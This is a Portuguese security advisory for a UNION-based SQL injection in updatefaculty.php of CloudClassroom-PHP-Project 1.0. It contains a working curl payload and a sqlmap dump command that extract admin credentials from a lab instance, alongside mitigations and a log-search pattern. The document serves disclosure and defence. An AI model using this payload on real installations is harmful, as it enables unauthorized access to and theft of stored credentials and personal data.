# Advisory de Segurança — SQL Injection em updatefaculty.php (parâmetro fid)

> **Identificador:** CVE pendente de atribuição / ID interno **CC-2026-04**
> **Data de publicação:** 02/08/2026
> **Última atualização:** 02/08/2026
> **Severidade:** Crítico
> **CVSS:** 9.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
> **CWE:** CWE-89: SQL Injection
> **Status:** Sem correção (unpatched)

---

## 1. Resumo executivo

Foi identificada uma vulnerabilidade em **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), no componente **updatefaculty.php**, que permite que **um atacante (Nenhuma (via Broken Access Control — item 00; o design pediria sessão de admin); interação do usuário: Nenhuma)** explore uma falha de **SQL Injection (UNION-based / error-based)**.

O parâmetro `fid` é interpolado sem aspas (numérico) na consulta SELECT. Em contexto numérico é possível `UNION SELECT`. A tabela consultada expõe 9 colunas. Confirmado com dump não-autenticado das credenciais de admin.

A exploração bem-sucedida pode resultar em **Leitura arbitrária do banco (C:H) — PII, senhas em texto puro, credenciais de admin; escrita via o sink UPDATE/POST (I:H); comprometimento total em cadeia.**

A divulgação segue política responsável/coordenada; a notificação formal ao fornecedor está prevista no pacote de divulgação (ver seções 13 e 14). Até o momento não há correção publicada.

---

## 2. Produtos afetados

| Produto / Componente | Versões afetadas | Versão corrigida | Status |
|---|---:|---:|---|
| CloudClassroom-PHP-Project | 1.0 (e anteriores) | Nenhuma | Afetado |
| Componente: updatefaculty.php | 1.0 | Nenhuma | Afetado |

- **Repositório / ecossistema:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
- **Stack avaliada:** PHP + MySQLi, Apache/2.4.41 (Ubuntu), MariaDB 10.3.39

### Produtos não afetados

- Nenhuma outra versão/produto avaliado neste advisory.

---

## 3. Descrição da vulnerabilidade

A vulnerabilidade ocorre devido a **SQL Injection (UNION-based / error-based)** no componente **updatefaculty.php**.

O parâmetro `fid` é interpolado sem aspas (numérico) na consulta SELECT. Em contexto numérico é possível `UNION SELECT`. A tabela consultada expõe 9 colunas. Confirmado com dump não-autenticado das credenciais de admin.

**Causa-raiz (trecho do código-fonte):**

**`updatefaculty.php`**

```php
$x=$_GET['fid'];
$sql="select * from <tabela> WHERE <col>=$x";
$rs=mysqli_query($connect,$sql);
```

### Condições necessárias

- Autenticação: Nenhuma (via Broken Access Control — item 00; o design pediria sessão de admin)
- Interação do usuário: Nenhuma
- Vetor de acesso: Remoto (rede) — método GET (+POST no UPDATE)
- Pré-condições: Nenhuma no alvo (item 00). Com o requisito de sessão original, PR sobe e o score cai.

---

## 4. Impacto

A exploração pode permitir:

- Leitura arbitrária do banco (C:H) — PII, senhas em texto puro, credenciais de admin
- escrita via o sink UPDATE/POST (I:H)
- comprometimento total em cadeia

### Impacto sobre a confidencialidade

Alto — um atacante pode ler dados sensíveis do sistema (PII, credenciais, dados de negócio).

### Impacto sobre a integridade

Alto — dados, configurações ou registros podem ser criados, alterados ou removidos de forma arbitrária.

### Impacto sobre a disponibilidade

Nenhum — sem impacto direto de disponibilidade.

---

## 5. Classificação

### CVSS

- **Pontuação:** 9.1
- **Severidade:** Crítico
- **Vetor:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

| Métrica | Valor |
|---|---|
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | None (N) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | High (H) |
| Integrity (I) | High (H) |
| Availability (A) | None (N) |

### CWE

- CWE-89: SQL Injection

### CAPEC

- **CAPEC-66 – SQL Injection**

---

## 6. Cenário de exploração

Um possível cenário de exploração ocorre da seguinte forma:

1. Requisitar `updatefaculty.php` com `fid` contendo o payload UNION (sem cookie — item 00).
2. Ajustar a contagem de colunas para 9 (tabela alvo) e posicionar os dados na coluna exibida.
3. Ler as credenciais de admin refletidas na resposta.
4. Automatizar com sqlmap (`-p fid`) para dump completo.

---

## 7. Evidências técnicas

### Componente afetado

```text
Arquivo(s): updatefaculty.php
Parâmetro(s): fid
Método: GET (+POST no UPDATE) · Autenticação: Nenhuma (via Broken Access Control — item 00; o design pediria sessão de admin)
```

### Requisição de exemplo

```http
POST /updatefaculty.php HTTP/1.1
Host: 127.0.0.1:9292
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<sessão — dispensável via item 00 (Broken Access Control)>

fid=<valor>
```

### Resposta observada

```text
[admin@ics.com:admin]
```

### Resultado

Reproduzido ao vivo no laboratório autorizado (http://127.0.0.1:9292/) em 02/08/2026, de forma não-destrutiva. O comportamento observado confirma a falha de SQL Injection (UNION-based / error-based).

**a) Execução no navegador** (resposta real do servidor renderizada, com faixa de evidência):

![Evidência de execução web — 04-updatefaculty-sqli](evidencia-web-04-updatefaculty-sqli.png)

**b) Linha de código vulnerável** (`updatefaculty.php`):

![Evidência de código-fonte — 04-updatefaculty-sqli](evidencia-codigo-04-updatefaculty-sqli.png)

> **Nota:** as credenciais/PII exibidas pertencem ao dataset de teste do laboratório. Remova segredos reais antes de qualquer publicação externa.

---

## 8. Prova de conceito

A prova de conceito abaixo demonstra apenas o comportamento vulnerável e deve ser utilizada exclusivamente em ambientes autorizados. Script executável e não-destrutivo: **`poc.sh`**.

```bash
curl -s -G "http://127.0.0.1:9292/updatefaculty.php" \
  --data-urlencode "fid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"

sqlmap -u "http://127.0.0.1:9292/updatefaculty.php?fid=1" -p fid --batch --dump -T admin
```

### Resultado esperado

```text
[admin@ics.com:admin]
[vishu:vishu]
```


### Limitações da PoC

- Não causa indisponibilidade intencional.
- Não remove ou modifica dados de terceiros (injeções de estado são restauradas; error-based aborta antes de persistir).
- Não cria persistência ou backdoor.
- Não contém credenciais reais (apenas dados do laboratório de teste).
- Não automatiza exploração em massa.

---

## 9. Passos para reprodução

1. Acesse uma instância de **CloudClassroom-PHP-Project 1.0**.
2. Configure o pré-requisito: Nenhuma no alvo (item 00). Com o requisito de sessão original, PR sobe e o score cai.
3. Acesse o componente **updatefaculty.php** (parâmetro(s): fid).
4. Envie a requisição/entrada descrita nas seções 7 e 8.
5. Observe o resultado vulnerável: [admin@ics.com:admin]
6. Compare com o comportamento seguro esperado (entrada devidamente validada/sanitizada/autorizada, sem reflexão do payload nem execução indevida).

---

## 10. Mitigação

Até que a correção definitiva seja aplicada, recomenda-se:

- Usar prepared statements com bind de parâmetros (`mysqli`/PDO) em 100% das consultas.
- Forçar o tipo dos identificadores numéricos (`(int)$id`) e usar allowlist quando aplicável.
- Não ecoar `$sql`/`mysqli_error()` ao cliente (remover oráculo de erro).
- Aplicar `exit;` após o guard de sessão (ver item 00).

Medidas compensatórias adicionais:

- Restringir o acesso ao componente afetado (rede/ACL/WAF).
- Aplicar regras de WAF/proxy reverso para bloquear padrões de ataque conhecidos.
- Revisar permissões e privilégios associados; invalidar sessões/credenciais potencialmente expostas.
- Manter logs e evidências para investigação.

> As mitigações reduzem o risco, mas podem não eliminar completamente a vulnerabilidade.

---

## 11. Correção

**Nenhuma correção oficial disponível até a data deste advisory (produto unpatched).**

Quando disponibilizada, recomenda-se:

1. Atualizar para a versão corrigida ou superior.
2. Reiniciar os serviços afetados, quando necessário.
3. Invalidar sessões e credenciais antigas.
4. Revisar logs anteriores à atualização.
5. Confirmar que o comportamento vulnerável não pode mais ser reproduzido.

### Alteração recomendada ao fornecedor

- Usar prepared statements com bind de parâmetros (`mysqli`/PDO) em 100% das consultas.
- Forçar o tipo dos identificadores numéricos (`(int)$id`) e usar allowlist quando aplicável.
- Não ecoar `$sql`/`mysqli_error()` ao cliente (remover oráculo de erro).
- Aplicar `exit;` após o guard de sessão (ver item 00).

---

## 12. Detecção e indicadores

Possíveis indicadores de exploração:

- Requisições a `updatefaculty.php` com `UNION`, `SELECT`, `extractvalue`, `concat`, aspas simples ou `-- ` no parâmetro `fid`.
- Mensagens de erro de banco (ex.: `XPATH syntax error`, erros do MariaDB/MySQL) refletidas nas respostas.

### Exemplo de busca em logs

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "updatefaculty.php"
```

---

## 13. Timeline de divulgação

| Data | Evento |
|---|---|
| 02/08/2026 | Vulnerabilidade identificada (análise estática) |
| 02/08/2026 | Confirmada dinamicamente no laboratório autorizado |
| 02/08/2026 | Re-validada ao vivo com evidências (navegador + código) |
| 02/08/2026 | Pacote de divulgação preparado (este advisory) |
| (pendente) | Notificação ao fornecedor |
| (pendente) | CVE solicitada/reservada |
| (pendente) | Correção disponibilizada |
| (pendente) | Publicação do advisory |

---

## 14. Comunicação com o fornecedor

- **Fornecedor:** Vishal Mathur (`mathurvishal`)
- **Canal utilizado:** GitHub Security Advisory privado do repositório / e-mail do mantenedor (ver `VENDOR-EMAIL.md`)
- **Data da primeira notificação:** (pendente)
- **Status da resposta:** Aguardando notificação/retorno
- **Posicionamento do fornecedor:** N/A até o momento

---

## 15. Créditos

A vulnerabilidade foi identificada e reportada por:

- **Pesquisador:** oliveira.luanalmeida@gmail.com e {NOME_EQUIPE} e {NOME_EQUIPE}
- **Organização:** Pesquisa independente de segurança
- **Contato:** oliveira.luanalmeida@gmail.com e {NOME_EQUIPE} e {NOME_EQUIPE}

---

## 16. Referências

- https://cwe.mitre.org/
- https://www.first.org/cvss/calculator/3.1
- https://cvefeed.io/vuln/product/161371/vishalmathurcloudclassroom-php_project/
- https://github.com/mathurvishal/CloudClassroom-PHP-Project
- https://www.first.org/cvss/calculator/3.1

---

## 17. Histórico de revisões

| Versão | Data | Alteração |
|---|---|---|
| 1.0 | 02/08/2026 | Publicação inicial |

---

## 18. Aviso legal

Este advisory é publicado com finalidade educacional, defensiva e de melhoria da segurança.

As informações apresentadas foram obtidas em ambiente autorizado e divulgadas de forma responsável ou coordenada. O autor não incentiva o uso destas informações para acesso não autorizado, interrupção de serviços, violação de privacidade ou qualquer atividade ilegal.

A utilização das informações deste documento é de responsabilidade exclusiva do leitor.

---

## 19. Contato

Para correções, atualizações ou informações adicionais:

- **E-mail:** oliveira.luanalmeida@gmail.com e {NOME_EQUIPE} e {NOME_EQUIPE}
- **Repositório:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
